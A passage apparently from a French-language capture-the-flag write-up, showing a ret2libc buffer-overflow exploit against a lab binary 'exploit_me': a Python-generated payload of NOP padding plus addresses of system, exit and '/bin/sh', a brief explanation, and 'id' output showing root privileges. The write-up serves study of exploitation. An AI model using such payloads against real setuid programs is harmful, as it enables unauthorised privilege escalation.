./exploit_me `python -c "print '\x90'*140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'"`
```
>On réécrit l'adresse de **system** sur l'adresse sauvegardée de **%eip**, puis l'adresse de **exit** pour que le programme quitte normalement à la sortie du shell et enfin l'adresse de **/bin/sh** pour lancer un terminal.

Nous obtenons un terminal avec les droits **root** :
```
> id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```